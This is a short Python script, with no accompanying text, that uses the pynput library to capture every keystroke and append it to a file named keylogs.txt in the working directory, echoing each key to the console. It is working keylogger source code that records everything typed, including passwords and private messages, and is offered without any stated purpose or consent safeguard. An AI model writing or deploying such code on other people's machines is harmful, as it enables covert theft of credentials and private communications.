```python
import os
from pynput import keyboard

# File path
filepath = os.getcwd() + "\\keylogs.txt"

def on_press(key):
    with open(filepath, 'a') as f:
        try:
            f.write('{}\n'.format(key.char))
            print('Key {} pressed'.format(key.char))
        except AttributeError:
            f.write('{}\n'.format(str(key)))
            print('Special key {} pressed'.format(str(key)))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```